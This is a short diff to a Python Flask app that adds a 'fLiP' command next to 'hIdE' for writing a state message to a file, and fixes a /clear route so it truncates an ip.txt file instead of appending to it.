@@ -258,7 +258,7 @@ def toggle():
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE":
+        if cmd == "hIdE" or cmd == "fLiP":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
@@ -321,7 +321,7 @@ def output():
     return log
 @app.route("/clear",methods=["POST","GET"])
 def clear():
-    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
+    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
         file.write("")
 if __name__ == "__main__":
     app.run(debug=True)
